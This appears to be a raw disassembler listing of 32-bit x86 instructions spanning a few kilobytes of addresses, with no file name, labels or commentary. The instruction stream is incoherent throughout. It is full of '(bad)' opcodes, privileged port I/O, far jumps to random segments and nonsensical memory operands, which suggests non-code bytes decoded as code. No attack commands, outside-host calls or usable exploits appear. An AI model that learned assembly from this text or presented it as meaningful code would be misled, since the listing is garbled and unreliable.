  424da5:	mov    ds:0xa54d14d4,al
  424daa:	pop    eax
  424dab:	push   es
  424dac:	(bad)  
  424dad:	jb     0x424de7
  424daf:	repz jge 0x424db7
  424db2:	pop    edi
  424db3:	mov    ds:0xcb17aab7,eax
  424db8:	fnstenv [ecx+0x2de79fa2]
  424dbe:	push   es
  424dbf:	jl     0x424de5
  424dc1:	fisttp QWORD PTR [edx+0x668dc5b7]
  424dc7:	icebp  
  424dc8:	lea    esp,ds:0x3b4c3320
  424dce:	ja     0x424de1
  424dd0:	cmc    
  424dd1:	loopne 0x424de3
  424dd3:	mov    cl,0x89
  424dd5:	adc    DWORD PTR [edx-0x5bd4e772],ecx
  424ddb:	loop   0x424d5f
  424ddd:	xor    DWORD PTR [esi+edi*2+0x528cac1f],ecx
  424de4:	pop    ebx
  424de5:	push   0xffffffb6
  424de7:	je     0x424e56
  424de9:	or     eax,0x8df9ac2e
  424dee:	rcr    BYTE PTR [ebx+0x27533389],cl
  424df4:	dec    ebp
  424df5:	(bad)  
  424df6:	setnp  BYTE PTR [edi+0x55]
  424dfa:	lea    ebx,[eax]
  424dfc:	in     al,0xf4
  424dfe:	ins    BYTE PTR es:[edi],dx
  424dff:	data16 jne 0x424e59
  424e02:	call   0x3b9f:0xba684244
  424e09:	cmp    ch,BYTE PTR [ebp+0x2bb31164]
  424e0f:	jp     0x424e69
  424e11:	sub    DWORD PTR [ecx],ebx
  424e13:	test   eax,0x702b0c62
  424e18:	cmc    
  424e19:	lods   eax,DWORD PTR ds:[esi]
  424e1a:	les    ebp,FWORD PTR ds:0x25a9b0d5
  424e20:	pop    esp
  424e21:	rcr    BYTE PTR [esi],1
  424e23:	les    ebx,FWORD PTR [esi+0x70]
  424e26:	sub    esp,DWORD PTR [ebx]
  424e28:	sbb    BYTE PTR [esi],ch
  424e2a:	aaa    
  424e2b:	std    
  424e2c:	xchg   esp,eax
  424e2d:	mov    esp,0xd4b82293
  424e32:	data16 std 
  424e34:	popa   
  424e35:	daa    
  424e36:	ss mov ebx,0x78c4d7ca
  424e3c:	adc    ah,BYTE PTR [ecx]
  424e3e:	std    
  424e3f:	js     0x424e30
  424e41:	or     BYTE PTR ss:[eax+0x20],cl
  424e45:	cmp    bl,dl
  424e47:	ror    DWORD PTR [ecx-0x47d589c2],1
  424e4d:	stc    
  424e4e:	je     0x424e7d
  424e50:	sub    eax,DWORD PTR [eax+0x76]
  424e53:	add    DWORD PTR [esi+0x54],edi
  424e56:	dec    DWORD PTR [esi+ebp*2-0x2e]
  424e5a:	sbb    eax,DWORD PTR ds:0x70ecc68
  424e60:	out    0xf6,al
  424e62:	add    DWORD PTR [ecx],esi
  424e64:	popa   
  424e65:	in     eax,dx
  424e66:	out    0x20,eax
  424e68:	mov    dl,0xac
  424e6a:	lods   eax,DWORD PTR ds:[esi]
  424e6b:	dec    ecx
  424e6c:	pop    edi
  424e6d:	mov    WORD PTR [ebx+0x2c],es
  424e70:	or     ah,0x2f
  424e73:	dec    esp
  424e74:	call   0x4e2f:0xe72b59e3
  424e7b:	mov    ebp,0xf0e87ae3
  424e80:	sar    bh,cl
  424e82:	lahf   
  424e83:	repz retf 0x68a8
  424e87:	mov    al,ds:0x35bbfdcc
  424e8c:	adc    BYTE PTR [ebp+0x23],dh
  424e8f:	inc    edx
  424e90:	das    
  424e91:	push   ebp
  424e92:	cmp    cl,ah
  424e94:	adc    al,0x3
  424e96:	mov    ebp,0x7a9e3b18
  424e9b:	outs   dx,DWORD PTR ds:[esi]
  424e9c:	mov    eax,0xa1b8874a
  424ea1:	shl    BYTE PTR [edi-0x793985d],cl
  424ea7:	push   edx
  424ea8:	or     al,0x63
  424eaa:	stos   DWORD PTR es:[edi],eax
  424eab:	mov    BYTE PTR [eax+edi*1+0x460a2926],al
  424eb2:	xchg   esi,eax
  424eb3:	(bad)  
  424eb4:	mov    edi,0x2b5a614a
  424eb9:	lds    ebx,FWORD PTR [ebx+0x8]
  424ebc:	fwait
  424ebd:	aad    0x6e
  424ebf:	into   
  424ec0:	pop    esp
  424ec1:	or     eax,0x696ca63
  424ec6:	xor    al,bl
  424ec8:	mov    al,ds:0xabee2714
  424ecd:	ins    BYTE PTR es:[edi],dx
  424ece:	mov    eax,0xb1b048b7
  424ed3:	hlt    
  424ed4:	dec    esp
  424ed5:	cmc    
  424ed6:	call   0x9733:0x6b7c7649
  424edd:	push   ds
  424ede:	cmp    BYTE PTR [ebx+0x63],dh
  424ee1:	std    
  424ee2:	ret    
  424ee3:	adc    eax,DWORD PTR [ecx]
  424ee5:	out    0x38,al
  424ee7:	out    0x52,al
  424ee9:	dec    edx
  424eea:	pop    ss
  424eeb:	jb     0x424ef1
  424eed:	dec    edi
  424eee:	mov    eax,ds:0xa25ceeac
  424ef3:	and    ecx,DWORD PTR [ebx]
  424ef5:	sbb    DWORD PTR [edx-0x74],0x29c7f8b7
  424efc:	mov    bh,0x77
  424efe:	xor    DWORD PTR [edi-0xa89d2cb],edi
  424f04:	(bad)  
  424f05:	stc    
  424f06:	xor    eax,0xc968b695
  424f0b:	je     0x424f6d
  424f0d:	add    BYTE PTR [ebx+0xc],cl
  424f10:	mov    dl,0xf1
  424f12:	bound  esp,QWORD PTR [ebp+0x6737bb49]
  424f18:	sbb    DWORD PTR [eax+ebx*8-0x67],esi
  424f1c:	fwait
  424f1d:	inc    edi
  424f1e:	xor    dh,BYTE PTR [eax-0x68]
  424f21:	inc    esp
  424f22:	hlt    
  424f23:	jmp    0xc4f5:0xf6171dbe
  424f2a:	ret    
  424f2b:	push   eax
  424f2c:	call   0xec1880e6
  424f31:	call   0x3f31:0x52e0193e
  424f38:	mov    WORD PTR [ebx-0x53],gs
  424f3b:	(bad)
  424f3e:	mov    eax,ds:0x51589fb1
  424f43:	int    0xfb
  424f45:	addr16 jne 0x424ef0
  424f48:	imul   edi,DWORD PTR [esi-0x5697b40d],0xcf41d2f4
  424f52:	aas    
  424f53:	in     eax,dx
  424f54:	sub    DWORD PTR [ebx+0x1b],esi
  424f57:	(bad)  
  424f59:	hlt    
  424f5a:	jmp    0xf3f7bd8c
  424f5f:	ins    BYTE PTR es:[edi],dx
  424f60:	jle    0x424fac
  424f62:	outs   dx,BYTE PTR ds:[esi]
  424f63:	mov    cl,0x5f
  424f65:	mov    ch,0x93
  424f67:	inc    edx
  424f68:	jne    0x424fcb
  424f6a:	mov    esi,0x3ae1b307
  424f6f:	shl    BYTE PTR [ebx],cl
  424f71:	cwde   
  424f72:	pop    ss
  424f73:	lods   eax,DWORD PTR ds:[esi]
  424f74:	jmp    0xfd947521
  424f79:	lock sub al,0x4f
  424f7c:	add    ch,0x50
  424f7f:	cdq    
  424f80:	and    BYTE PTR [esi+ecx*2-0x55],0x2e
  424f85:	inc    ebp
  424f86:	adc    al,0x93
  424f88:	inc    esp
  424f89:	dec    ecx
  424f8a:	je     0x424fa4
  424f8c:	addr16 inc ecx
  424f8e:	adc    al,BYTE PTR [esi]
  424f90:	(bad)  
  424f91:	or     ebx,DWORD PTR [edx+0x10]
  424f94:	dec    esp
  424f95:	sub    BYTE PTR [eax-0x23c098f4],bh
  424f9b:	jne    0x424fab
  424f9d:	pop    ebp
  424f9e:	cmp    bl,ah
  424fa0:	dec    edi
  424fa1:	pop    ecx
  424fa2:	xlat   BYTE PTR ds:[ebx]
  424fa3:	jo     0x425015
  424fa5:	cmc    
  424fa6:	(bad)  
  424fa8:	je     0x424fcf
  424faa:	es (bad) 
  424fac:	fwait
  424fad:	jmp    0x424faf
  424faf:	pop    ecx
  424fb0:	mov    eax,0x53e09403
  424fb5:	xchg   ebx,eax
  424fb6:	mov    dh,0x4b
  424fb8:	and    esp,DWORD PTR [ecx+0x6a81512a]
  424fbe:	iret   
  424fbf:	fst    QWORD PTR [edx+0x4b]
  424fc2:	jmp    0x424fc2
  424fc4:	push   cs
  424fc5:	loop   0x424fed
  424fc7:	outs   dx,BYTE PTR ds:[esi]
  424fc8:	mov    ah,0x77
  424fca:	lock mov esp,0x55740ea
  424fd0:	fwait
  424fd1:	mov    ah,BYTE PTR [ebp-0x5842713e]
  424fd7:	ret    0xfe6e
  424fda:	je     0x424f87
  424fdc:	je     0x424ff4
  424fde:	jae    0x42501d
  424fe0:	adc    dl,0x58
  424fe3:	lahf   
  424fe4:	and    cl,BYTE PTR ds:0x357faeff
  424fea:	nop
  424feb:	add    eax,0xfb4e28ab
  424ff0:	and    ebx,DWORD PTR [eax+0x6cdc2e42]
  424ff6:	stos   DWORD PTR es:[edi],eax
  424ff7:	leave  
  424ff8:	sub    cl,ch
  424ffa:	in     eax,dx
  424ffb:	test   eax,0x14bf9fb7
  425000:	call   0xd3cb:0x8b2274f2
  425007:	nop
  425008:	mov    ebp,0xea926c81
  42500d:	cmp    ah,BYTE PTR [ebp-0x5f]
  425010:	push   edi
  425011:	call   0x15a217ec
  425016:	jne    0x425073
  425018:	dec    ebp
  425019:	push   edi
  42501a:	xor    DWORD PTR [esi],0xffffff9b
  42501d:	pusha  
  42501e:	mov    cl,0x23
  425020:	stc    
  425021:	inc    cx
  425023:	lahf   
  425024:	add    eax,0x5b03ba73
  425029:	mov    DWORD PTR ds:0x458a2c0e,ecx
  42502f:	xor    al,0xbc
  425031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425032:	ds scas al,BYTE PTR es:[edi]
  425034:	dec    ecx
  425035:	mov    dl,0x14
  425037:	jno    0x425007
  425039:	sbb    DWORD PTR [ebx+0x41511c4f],edi
  42503f:	mov    ch,0x79
  425041:	fistp  QWORD PTR [esi+esi*2]
  425044:	scas   eax,DWORD PTR es:[edi]
  425045:	std    
  425046:	cmp    DWORD PTR [eax+0x7f],0x7d33800
  42504d:	xor    BYTE PTR [edx+ebp*4+0x4f],dl
  425051:	inc    eax
  425052:	jg     0x42505e
  425054:	call   0x143cd1d9
  425059:	push   cs
  42505a:	stc    
  42505b:	stos   BYTE PTR es:[edi],al
  42505c:	mov    eax,ds:0x21011b28
  425061:	cmp    al,BYTE PTR [ecx+0x16]
  425064:	or     bh,BYTE PTR [ebp+0x32ae5c06]
  42506a:	pop    eax
  42506b:	xchg   ecx,eax
  42506c:	(bad)  
  42506d:	mov    ch,0x56
  42506f:	rol    DWORD PTR [ebx+edx*8],cl
  425072:	adc    al,0x7c
  425074:	pop    esp
  425075:	cwde   
  425076:	adc    al,bh
  425078:	out    0x51,eax
  42507a:	mov    DWORD PTR [edi+0x5f],ebp
  42507d:	push   esi
  42507e:	inc    esi
  42507f:	loope  0x425041
  425081:	xchg   ebx,eax
  425082:	or     bl,BYTE PTR [eax+0x16]
  425085:	in     eax,0x1
  425087:	jecxz  0x4250fd
  425089:	sub    al,0xce
  42508b:	mov    bl,0x3a
  42508d:	stos   DWORD PTR es:[edi],eax
  42508e:	mov    edx,0x89dbd576
  425093:	adc    bh,BYTE PTR [edx+0x1a05aa6f]
  425099:	fdivr  st,st(2)
  42509b:	scas   eax,DWORD PTR es:[edi]
  42509c:	out    dx,eax
  42509d:	pop    es
  42509e:	outs   dx,DWORD PTR ds:[esi]
  42509f:	jmp    0xaf5a:0xb2eb93a3
  4250a6:	push   ss
  4250a7:	popf   
  4250a8:	jle    0x4250c1
  4250aa:	jbe    0x42504a
  4250ac:	repz cmp BYTE PTR [edx+0x7ab58e9f],al
  4250b3:	rcr    BYTE PTR [edi],cl
  4250b5:	adc    eax,0x581f2aa6
  4250ba:	mov    ebx,0x49779e4e
  4250bf:	mov    eax,0xc8313490
  4250c4:	icebp  
  4250c5:	les    eax,FWORD PTR [ebp-0x62ae3d5]
  4250cb:	fbld   TBYTE PTR [edx-0x3a]
  4250ce:	jl     0x4250f3
  4250d0:	mov    esp,0xbf3822a7
  4250d5:	loop   0x42514a
  4250d7:	(bad)  
  4250d8:	jg     0x425131
  4250da:	dec    edi
  4250db:	sti    
  4250dc:	iret   
  4250dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250de:	jno    0x4250e6
  4250e0:	inc    esp
  4250e1:	mov    DWORD PTR [esi+0x202139f8],esi
  4250e7:	(bad)  
  4250e8:	fsubrp st(0),st
  4250ea:	mov    WORD PTR [esi-0x4e91aa0a],?
  4250f0:	or     ah,BYTE PTR [edx]
  4250f2:	hlt    
  4250f3:	(bad)  
  4250f4:	idiv   BYTE PTR [ecx-0x78]
  4250f7:	or     esp,ebx
  4250f9:	mov    dl,0xaf
  4250fb:	add    BYTE PTR [esi-0x2b],al
  4250fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250ff:	xor    ch,BYTE PTR [ecx]
  425101:	imul   esi,DWORD PTR [edi-0xd],0x21
  425105:	sbb    dh,BYTE PTR [eax]
  425107:	bound  edx,QWORD PTR [esp+edi*8]
  42510a:	mov    dl,0xe4
  42510c:	xor    ah,BYTE PTR [ebx-0x37]
  42510f:	inc    edx
  425110:	(bad)  
  425111:	pop    ebx
  425112:	mov    bl,0x7e
  425114:	sar    BYTE PTR [esi+0x153fd847],1
  42511a:	idiv   DWORD PTR [esi+0x1ef5769e]
  425120:	adc    BYTE PTR [eax+0x617061b4],dl
  425126:	int    0xee
  425128:	or     BYTE PTR [esi+0x1580d1f6],bh
  42512e:	jno    0x425145
  425130:	lea    esi,[ecx]
  425132:	pop    ecx
  425133:	jl     0x425134
  425135:	adc    ebp,edi
  425137:	sub    ah,0xb
  42513a:	xchg   esi,eax
  42513b:	jle    0x4250fe
  42513d:	jmp    0x4251b3
  42513f:	mov    al,0xf3
  425141:	call   0x76213701
  425146:	add    al,bh
  425148:	cs je  0x4251b3
  42514b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42514d:	pop    esp
  42514e:	fwait
  42514f:	inc    ebp
  425150:	jl     0x425191
  425152:	mov    esp,0x5044e5b4
  425157:	aas    
  425158:	adc    al,BYTE PTR [ecx+esi*4-0x1d]
  42515c:	push   esp
  42515d:	add    bl,ah
  42515f:	retf   0xb00d
  425162:	shl    BYTE PTR [ecx-0x5ae10621],1
  425168:	push   ecx
  425169:	scas   eax,DWORD PTR es:[edi]
  42516a:	aas    
  42516b:	test   eax,0xd702ada1
  425170:	cdq    
  425171:	sbb    al,0x53
  425173:	mov    BYTE PTR ds:0xb6d90821,cl
  425179:	mov    esp,0x61105604
  42517e:	xchg   ecx,eax
  42517f:	mov    esi,0xa3445645
  425184:	pushf  
  425185:	ins    BYTE PTR es:[edi],dx
  425186:	aam    0x1
  425188:	jb     0x4251ea
  42518a:	test   dh,bl
  42518c:	mov    eax,ds:0x9ba5c150
  425191:	lea    edi,[ecx-0x7720b5d4]
  425197:	mov    esp,0xcc6601df
  42519c:	rcl    ch,1
  42519e:	push   ss
  42519f:	das    
  4251a0:	jmp    0xf54166cc
  4251a5:	mov    WORD PTR [ecx+0x41],gs
  4251a8:	les    edi,FWORD PTR [ebx+eax*4+0x1286382b]
  4251af:	sub    al,0x66
  4251b1:	jb     0x42514c
  4251b3:	jno    0x425177
  4251b5:	daa    
  4251b6:	cmc    
  4251b7:	fs jmp 0x6a69:0x7446395d
  4251bf:	xlat   BYTE PTR ds:[ebx]
  4251c0:	xchg   DWORD PTR [edx],ebp
  4251c2:	jno    0x425202
  4251c4:	stos   DWORD PTR es:[edi],eax
  4251c5:	inc    eax
  4251c6:	xor    al,0x8b
  4251c8:	loopne 0x42523c
  4251ca:	leave  
  4251cb:	popf   
  4251cc:	retf   0x628a
  4251cf:	in     al,dx
  4251d0:	dec    ecx
  4251d1:	cmp    DWORD PTR [eax],ebx
  4251d3:	inc    edx
  4251d4:	push   ecx
  4251d5:	inc    eax
  4251d6:	cli    
  4251d7:	inc    edi
  4251d8:	hlt    
  4251d9:	popf   
  4251da:	imul   BYTE PTR [esp+eiz*2+0x7dd2bf4e]
  4251e1:	xchg   edi,eax
  4251e2:	and    bh,BYTE PTR ds:0x71880d2f
  4251e8:	pop    ecx
  4251e9:	add    al,0xc4
  4251eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251ec:	repz lahf 
  4251ee:	cmp    BYTE PTR [edx-0x45b507cd],bh
  4251f4:	sbb    BYTE PTR [esi+0x4eb9ceba],bl
  4251fa:	bound  ebp,QWORD PTR [edi-0x6a]
  4251fd:	jo     0x425262
  4251ff:	pop    es
  425200:	dec    edx
  425201:	(bad)  
  425202:	mov    ebp,DWORD PTR [edx]
  425204:	push   ds
  425205:	cld    
  425206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425207:	out    0xaa,al
  425209:	sbb    bh,BYTE PTR [ebp-0x4980a912]
  42520f:	mov    dh,0x69
  425211:	jmp    0x36ec:0x4d9e8a4f
  425218:	xchg   ebx,eax
  425219:	and    al,0x24
  42521b:	cmp    BYTE PTR [ebp+ecx*2+0x1],dl
  42521f:	mov    eax,0x88fd10c8
  425224:	pop    esi
  425225:	push   ebx
  425226:	inc    edx
  425227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425228:	sbb    eax,0xef4163c7
  42522d:	mov    ?,WORD PTR [ebx-0x66a63f68]
  425233:	pop    ds
  425234:	ret    0xa9b0
  425237:	loop   0x4252ab
  425239:	xchg   ebx,eax
  42523a:	dec    ebx
  42523b:	pop    esi
  42523c:	test   al,0x19
  42523e:	retf   
  42523f:	call   0xf9aaed1e
  425244:	loope  0x425293
  425246:	mov    ds,edi
  425248:	je     0x4251f3
  42524a:	ror    BYTE PTR [ebx],1
  42524c:	rol    BYTE PTR [eax],cl
  42524e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42524f:	sub    al,0xa2
  425251:	or     DWORD PTR [esp+ebp*4+0x298f649a],eax
  425258:	retf   0x8c74
  42525b:	ficomp WORD PTR [eax+0x41]
  42525e:	popf   
  42525f:	mov    ecx,0xcbaaf8b7
  425264:	stos   DWORD PTR es:[edi],eax
  425265:	shl    DWORD PTR [bx-0x52b6],cl
  42526a:	xor    ah,BYTE PTR [edi]
  42526c:	xor    dh,ah
  42526e:	dec    edx
  42526f:	push   ss
  425270:	stos   DWORD PTR es:[edi],eax
  425271:	scas   al,BYTE PTR es:[edi]
  425272:	push   edi
  425273:	and    ch,BYTE PTR [edi+0x61]
  425276:	and    BYTE PTR [edi-0x7e],0x52
  42527a:	mov    WORD PTR [edi+ebp*8],ss
  42527d:	jb     0x42527d
  42527f:	jge    0x4252d9
  425281:	pop    es
  425282:	aas    
  425283:	mov    esi,0x832aa861
  425288:	into   
  425289:	lock dec ecx
  42528b:	out    dx,al
  42528c:	dec    ecx
  42528d:	inc    edx
  42528e:	cs mov ch,0xcc
  425291:	mov    ecx,edx
  425293:	jne    0x425267
  425295:	jp     0x4252f7
  425297:	and    DWORD PTR [ecx+0x4f],esi
  42529a:	or     edx,DWORD PTR [eax]
  42529c:	sahf   
  42529d:	mov    ah,0x84
  42529f:	pop    ebx
  4252a0:	retf   0xe402
  4252a3:	xor    al,0x1e
  4252a5:	sbb    BYTE PTR [edx-0x6dafbb2],dl
  4252ab:	imul   edi,ecx,0xffffffce
  4252ae:	pusha  
  4252af:	cmp    al,0x4f
  4252b1:	aad    0x70
  4252b3:	in     al,dx
  4252b4:	sbb    ebp,DWORD PTR [ebp+ecx*2-0x58]
  4252b8:	sbb    BYTE PTR [edi+esi*2+0x12d00d9d],0x95
  4252c0:	jle    0x42527a
  4252c2:	mov    ebp,ss
  4252c4:	or     dh,BYTE PTR ds:0xa481c570
  4252ca:	or     al,0xca
  4252cc:	push   0xffffffa1
  4252ce:	je     0x425260
  4252d0:	loop   0x42532e
  4252d2:	pop    es
  4252d3:	in     al,0x4f
  4252d5:	aaa    
  4252d6:	idiv   BYTE PTR gs:[ebp+eiz*4+0x29556362]
  4252de:	mov    esp,0x82efeec1
  4252e3:	push   ebp
  4252e4:	ja     0x425296
  4252e6:	dec    DWORD PTR [ecx+edx*8]
  4252e9:	fidiv  DWORD PTR [ebx+0x34]
  4252ec:	cmp    BYTE PTR [ebx+0x401fea8c],0xa2
  4252f3:	js     0x425331
  4252f5:	test   BYTE PTR [ecx],bh
  4252f7:	sub    al,0x86
  4252f9:	inc    eax
  4252fa:	(bad)  
  4252fb:	mov    ecx,0x84217511
  425300:	push   edi
  425301:	dec    eax
  425302:	inc    ebp
  425303:	shr    al,0x24
  425306:	mov    dh,0x3
  425308:	retf   0xcc8a
  42530b:	cwde   
  42530c:	clc    
  42530d:	sar    BYTE PTR [esi+ebp*8+0x41],0xd0
  425312:	push   ecx
  425313:	add    eax,0x97bb8a18
  425318:	iret   
  425319:	inc    ebx
  42531a:	pushf  
  42531b:	ja     0x425392
  42531d:	mov    ecx,0x7541cc85
  425322:	mov    al,ds:0x5549c207
  425327:	(bad)  
  425328:	fistp  QWORD PTR [ebp+0x28f8fc44]
  42532e:	daa    
  42532f:	mov    al,ds:0xe598c5a3
  425334:	popf   
  425335:	sti    
  425336:	xchg   edx,eax
  425337:	xor    ebp,0xe2b0c980
  42533d:	pushf  
  42533e:	out    dx,eax
  42533f:	out    dx,eax
  425340:	fwait
  425341:	push   eax
  425342:	sbb    eax,0x96195eb3
  425347:	jecxz  0x4253c8
  425349:	es inc edx
  42534b:	inc    ebp
  42534c:	xchg   ecx,eax
  42534d:	mov    ch,0xd6
  42534f:	int3   
  425350:	dec    ecx
  425351:	sub    cl,BYTE PTR [eax]
  425353:	cdq    
  425354:	jge    0x425379
  425356:	(bad)  
  425357:	mov    DWORD PTR [ebx],ebx
  425359:	outs   dx,DWORD PTR ds:[esi]
  42535a:	ror    BYTE PTR [ecx-0x51ceea7],cl
  425360:	push   0x23a6d43
  425365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425366:	adc    eax,esp
  425368:	js     0x4252fc
  42536a:	and    dh,BYTE PTR [ecx-0x504e6d0]
  425370:	mov    ah,0x2c
  425372:	stos   BYTE PTR es:[edi],al
  425373:	into   
  425374:	outs   dx,DWORD PTR ds:[esi]
  425375:	mov    dl,0xa3
  425377:	xor    eax,0x80443975
  42537c:	pop    esi
  42537d:	xchg   BYTE PTR [ebx+0x2f],ch
  425380:	rol    BYTE PTR [ecx+0x27984b2f],cl
  425386:	fsub   DWORD PTR [edi]
  425388:	es jge 0x42534c
  42538b:	jmp    0x4253dc
  42538d:	test   BYTE PTR [ecx-0x9],0x4a
  425391:	push   ebp
  425392:	xor    al,0xc6
  425394:	push   0xffffff8a
  425396:	pop    esi
  425397:	jbe    0x425321
  425399:	je     0x425394
  42539b:	rcl    DWORD PTR [edi+0xd52779c],0x14
  4253a2:	mov    ebp,0xa29513ec
  4253a7:	sar    BYTE PTR [ecx],1
  4253a9:	adc    eax,0x409617c5
  4253ae:	loope  0x425336
  4253b0:	sub    bl,dl
  4253b2:	sub    eax,0x161a2173
  4253b7:	mov    ch,0x6f
  4253b9:	call   0x87be:0xfca198b9
  4253c0:	sbb    bl,BYTE PTR [ecx+0x2f]
  4253c3:	xor    dh,BYTE PTR [edi-0x6b]
  4253c6:	and    eax,0x6c9bb916
  4253cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253cc:	iret   
  4253cd:	push   edx
  4253ce:	fisttp DWORD PTR [ecx-0x40]
  4253d1:	mov    ds:0xf6ca5556,al
  4253d6:	mov    cl,0x17
  4253d8:	pop    eax
  4253d9:	mov    ecx,0xbfa9fca
  4253de:	pop    ebp
  4253df:	sti    
  4253e0:	pop    esi
  4253e1:	sbb    eax,0x2e5572c3
  4253e6:	mov    ds:0xa412c80b,al
  4253eb:	sti    
  4253ec:	or     BYTE PTR [eax-0x27],al
  4253ef:	pop    esi
  4253f0:	fdivr  DWORD PTR [esi]
  4253f2:	cmc    
  4253f3:	cld    
  4253f4:	mov    dh,0x1e
  4253f6:	jecxz  0x425383
  4253f8:	push   esi
  4253f9:	outs   dx,BYTE PTR ds:[esi]
  4253fa:	or     cl,BYTE PTR [eax+0x6f]
  4253fd:	jecxz  0x42544a
  4253ff:	leave  
  425400:	cmp    bl,BYTE PTR [edx]
  425402:	push   cs
  425403:	mov    bl,0xfa
  425405:	inc    esi
  425406:	ret    0x17e9
  425409:	or     al,0xf3
  42540b:	push   0xffffffe3
  42540d:	ins    BYTE PTR es:[edi],dx
  42540e:	or     eax,0x858665ab
  425413:	loopne 0x42547b
  425415:	push   0xffffffc8
  425417:	sbb    DWORD PTR [edx+0xa742b8],ecx
  42541d:	fcmovne st,st(6)
  42541f:	xchg   ecx,eax
  425420:	repnz xchg edx,eax
  425422:	arpl   WORD PTR [edx+0x35],di
  425425:	jb     0x425487
  425427:	jne    0x425498
  425429:	pop    esi
  42542a:	sbb    dh,BYTE PTR [eax-0xfb7f959]
  425430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425431:	sbb    eax,0xbdf72d4
  425436:	loopne 0x425432
  425438:	and    DWORD PTR [eax+0x7],ecx
  42543b:	leave  
  42543c:	js     0x425476
  42543e:	sub    DWORD PTR [esi-0x45184840],edi
  425444:	adc    BYTE PTR [eax+0x66],ch
  425447:	nop
  425448:	cmc    
  425449:	out    0xeb,al
  42544b:	xchg   ebx,eax
  42544c:	pop    eax
  42544d:	xor    BYTE PTR [edx],0x94
  425450:	inc    ecx
  425451:	inc    ebp
  425452:	xchg   edi,eax
  425453:	fistp  WORD PTR [edx]
  425455:	fs loope 0x42540d
  425458:	jge    0x4253fd
  42545a:	pop    ss
  42545b:	xor    al,0x9c
  42545d:	jae    0x425428
  42545f:	in     eax,0x89
  425461:	sub    ebx,ebp
  425463:	sub    BYTE PTR [eax+0x77],al
  425466:	or     al,0xe5
  425468:	xor    esi,esi
  42546a:	jecxz  0x42542e
  42546c:	add    DWORD PTR [ecx-0x24],ebx
  42546f:	jmp    0x4253f4
  425471:	mov    DWORD PTR [esi+ebx*4+0x7ef701a0],edi
  425478:	mov    DWORD PTR [eax],edx
  42547a:	xor    ebx,DWORD PTR [esi]
  42547c:	xchg   esi,eax
  42547d:	pop    edx
  42547e:	sahf   
  42547f:	mov    bh,0xe4
  425481:	adc    edx,DWORD PTR ds:0xd0b006a3
  425487:	and    al,0xc
  425489:	and    esp,0xffffffa9
  42548c:	mov    ebp,0x7f4c48d7
  425491:	adc    al,0x3
  425493:	je     0x42545d
	...
  425511:	add    BYTE PTR [eax],al
  425513:	add    BYTE PTR [ecx],dh
  425515:	loopne 0x4254f8
  425517:	mov    ecx,0xe879b9f1
  42551c:	aas    
  42551d:	stos   DWORD PTR es:[edi],eax
  42551e:	in     al,0x3
  425520:	enter  0x50e1,0x4d
  425524:	jne    0x42550d
  425526:	add    DWORD PTR [eax],eax
  425528:	imul   eax,DWORD PTR [edi],0x7cab0000
  42552e:	xor    eax,0x9f7d3f2d
  425533:	inc    esi
  425534:	mov    ecx,0x74ba440e
  425539:	std    
  42553a:	fwait
  42553b:	(bad)  
  42553c:	mov    eax,?
  42553e:	push   cs
  42553f:	test   BYTE PTR [ecx],bh
  425541:	je     0x4255ab
  425543:	jl     0x425536
  425545:	sub    BYTE PTR [ecx-0x2c],bh
  425548:	out    dx,eax
  425549:	daa    
  42554a:	sbb    eax,0x37738526
  42554f:	sbb    eax,0x8df08ff9
  425554:	push   DWORD PTR [esi+0xb9e031e]
  42555a:	rcl    DWORD PTR [ecx],1
  42555c:	mov    DWORD PTR [si+0x2994],esi
  425561:	xchg   ebx,edi
  425563:	sub    cl,BYTE PTR [ecx+0x31]
  425566:	mov    eax,0x26b7f0ff
  42556b:	mov    ebx,0xc7f3665b
  425570:	jbe    0x425506
  425572:	xor    esi,ebp
  425574:	jb     0x4255cf
  425576:	and    edx,DWORD PTR [eax-0x38]
  425579:	dec    edi
  42557a:	cli    
  42557b:	cmp    DWORD PTR [eax+0x44],edx
  42557e:	sbb    BYTE PTR [edx-0xe],0xe3
  425582:	(bad)  
  425583:	add    al,0x7d
  425585:	neg    BYTE PTR [ebx+0x372f95d1]
  42558b:	test   DWORD PTR [esi-0x44bd6bf0],ebx
  425591:	cmp    ch,dh
  425593:	popf   
  425594:	push   esi
  425595:	fsubr  DWORD PTR [edi-0x5]
  425598:	ins    BYTE PTR es:[edi],dx
  425599:	std    
  42559a:	xchg   edi,eax
  42559b:	jmp    0x17b5:0xde3cc44e
  4255a2:	je     0x425598
  4255a4:	sub    DWORD PTR [ebx+0x4804b2d5],ebp
  4255aa:	cmp    esi,DWORD PTR [edi]
  4255ac:	jge    0x4255e3
  4255ae:	push   ebx
  4255af:	je     0x4255a1
  4255b1:	adc    BYTE PTR es:[esi],0x85
  4255b5:	shr    BYTE PTR [ebx],1
  4255b7:	daa    
  4255b8:	and    ebp,DWORD PTR [ecx+ecx*8]
  4255bb:	xor    ecx,DWORD PTR [ebx-0x4660c124]
  4255c1:	rcl    ebp,cl
  4255c3:	push   eax
  4255c4:	inc    ebp
  4255c5:	sbb    ebx,DWORD PTR [eax+0x49654ba8]
  4255cb:	xchg   BYTE PTR [eax+0x753bf356],ah
  4255d1:	mov    eax,0x1d15498c
  4255d6:	xchg   edx,eax
  4255d7:	sar    BYTE PTR [edi+ebp*4],0xfe
  4255db:	retf   
  4255dc:	dec    ebx
  4255dd:	ins    DWORD PTR es:[edi],dx
  4255de:	mov    esi,0x5ed09b75
  4255e3:	(bad)  
  4255e4:	or     ch,bh
  4255e6:	sub    al,0x59
  4255e8:	popa   
  4255e9:	aas    
  4255ea:	(bad)  [ecx-0x33a4e663]
  4255f0:	rcl    BYTE PTR [eax],cl
  4255f2:	inc    esp
  4255f3:	inc    esp
  4255f4:	add    al,0x17
  4255f6:	loope  0x4255b7
  4255f8:	fmul   QWORD PTR [esi+0x34]
  4255fb:	ficomp WORD PTR [eax-0xa]
  4255fe:	mov    eax,ds:0xbda41d44
  425603:	dec    esi
  425604:	cld    
